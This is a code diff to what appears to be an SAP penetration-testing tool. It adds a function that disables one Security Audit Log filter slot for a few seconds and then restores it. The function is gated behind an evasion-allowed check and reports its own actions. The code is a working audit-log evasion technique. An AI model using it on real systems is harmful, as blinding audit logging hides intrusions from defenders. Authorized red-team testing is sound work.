@@ -29,7 +29,8 @@ import logging
 from typing import Optional
 
 from sapmap_evasion_baseline import (capture_baseline, change_param,
-                                       evasion_window)
+                                       evasion_window,
+                                       write_dyn_profile)
 from sapmap_evasion_gate import (assert_evasion_allowed,
                                    EvasionGateError, technique_label)
 
@@ -453,6 +454,149 @@ def tier3_probe_dyn_profile(state, node, creds=None,
                        f"in ET_LOG: {log_errors[0].get('MESSAGE','')}"
                        if log_errors else ""),
             "loot_path": loot_path}
+
+
+def tier3_sal_slot_disable(state, node, slotno,
+                              hold_seconds: float = 5.0,
+                              creds=None) -> dict:
+    """Phase 3 step 2 — disable one SAL filter slot for *hold_seconds*,
+    then restore.
+
+    The first concrete Tier 3 technique.  Flow:
+
+      1. Assert ``--allow-evasion`` AND a baseline exists.
+      2. Open an ``evasion_window`` with
+         ``touched_dyn_profile=True`` so window exit auto-rewrites
+         the baseline ET_FILT / ET_FILTEX / ET_TEXT rows.
+      3. Read the current dynamic profile fresh (mutate from kernel
+         state, not stale snapshot).
+      4. Find the row whose ``SLOTNO`` matches; flip
+         ``STATUS='X'`` → ``STATUS=' '``.
+      5. Write the modified rows back via ``write_dyn_profile``.
+      6. Sleep ``hold_seconds`` — the operator can verify in SM19 /
+         RSAU_CONFIG that the slot is genuinely inactive on the
+         server during this window.
+      7. Window exit fires the dyn-profile restore, writing the
+         baseline rows back as captured.
+
+    Args:
+        slotno: target slot identifier, e.g. ``"0001"`` or ``1``.
+        hold_seconds: how long to keep the slot disabled before
+            restoring.  Defaults to 5 seconds — long enough for the
+            operator to glance at RSAU_CONFIG.
+
+    Returns ``{ok, technique, slotno, hold_seconds, baseline_status,
+    before_active_count, after_restore, error}``.  ``before_active_count``
+    is the count of STATUS='X' rows at mutation time (sanity check).
+    """
+    import time as _time
+    technique = "sal_filter_narrow"
+    try:
+        assert_evasion_allowed(state, node, technique)
+    except EvasionGateError as e:
+        return _wrap_result(technique, False, error=str(e),
+                             slotno=str(slotno),
+                             hold_seconds=hold_seconds)
+
+    slotno_str = str(slotno).strip().zfill(4)
+    sid = getattr(node, "sid", "?")
+
+    try:
+        with evasion_window(node, state, technique, creds=creds,
+                             touched_dyn_profile=True) as frame:
+            # Read fresh — never mutate from a stale baseline.
+            current = read_dyn_profile(node, creds=creds)
+            log_errors = _et_log_errors(current.get("ET_LOG"))
+            if log_errors:
+                return _wrap_result(
+                    technique, False,
+                    slotno=slotno_str, hold_seconds=hold_seconds,
+                    error=(f"fresh read failed: "
+                            f"{log_errors[0].get('MESSAGE','')}"))
+
+            et_filt = list(current.get("ET_FILT") or [])
+            et_filtex = list(current.get("ET_FILTEX") or [])
+            et_text = list(current.get("ET_TEXT") or [])
+
+            # Locate the target row.
+            target = None
+            for row in et_filt:
+                if str(row.get("SLOTNO", "")).strip().zfill(4) == slotno_str:
+                    target = row
+                    break
+            if target is None:
+                return _wrap_result(
+                    technique, False,
+                    slotno=slotno_str, hold_seconds=hold_seconds,
+                    error=f"slot {slotno_str} not present in dyn profile")
+
+            baseline_status = str(target.get("STATUS", "")).strip() or " "
+            active_before = sum(
+                1 for r in et_filt
+                if str(r.get("STATUS", "")).strip() == "X")
+
+            print(f"[*] {sid}: SAL slot {slotno_str} — current "
+                  f"STATUS={baseline_status!r}; {active_before} of "
+                  f"{len(et_filt)} slot(s) currently active")
+
+            # Mutate — copy rows, flip STATUS on target.
+            mutated_filt = []
+            for r in et_filt:
+                copy = dict(r)
+                if str(copy.get("SLOTNO", "")).strip().zfill(4) == slotno_str:
+                    copy["STATUS"] = " "
+                mutated_filt.append(copy)
+
+            w = write_dyn_profile(node, creds, mutated_filt,
+                                    et_filtex, et_text)
+            if not w["ok"]:
+                return _wrap_result(
+                    technique, False,
+                    slotno=slotno_str, hold_seconds=hold_seconds,
+                    baseline_status=baseline_status,
+                    before_active_count=active_before,
+                    error=f"write failed: {w['error']}")
+
+            print(f"[+] {sid}: SAL slot {slotno_str} disabled — "
+                  f"holding {hold_seconds}s before restore")
+            try:
+                from sapmap_findings import emit_finding
+                emit_finding(
+                    "WARNING", sid,
+                    f"Tier 3: SAL slot {slotno_str} disabled "
+                    f"(STATUS X→' ') for {hold_seconds}s window — "
+                    f"verify in SM19 / RSAU_CONFIG")
+            except Exception:
+                pass
+
+            _time.sleep(max(0.0, float(hold_seconds)))
+
+        # Window exit ran restore automatically — log here so the
+        # operator sees the round-trip completion clearly.
+        print(f"[+] {sid}: SAL slot {slotno_str} restored — window "
+              f"closed cleanly")
+        try:
+            from sapmap_findings import emit_finding
+            emit_finding(
+                "INFO", sid,
+                f"Tier 3: SAL slot {slotno_str} restored to "
+                f"baseline (STATUS={baseline_status!r})")
+        except Exception:
+            pass
+        return _wrap_result(
+            technique, True,
+            slotno=slotno_str, hold_seconds=hold_seconds,
+            baseline_status=baseline_status,
+            before_active_count=active_before,
+            after_restore="auto via evasion_window")
+    except EvasionGateError as e:
+        return _wrap_result(technique, False, error=str(e),
+                             slotno=slotno_str,
+                             hold_seconds=hold_seconds)
+    except Exception as e:
+        return _wrap_result(
+            technique, False, error=f"unexpected: {e!r}",
+            slotno=slotno_str, hold_seconds=hold_seconds)
 
 
 def tier3_capture_baseline_only(state, node, creds=None) -> dict:
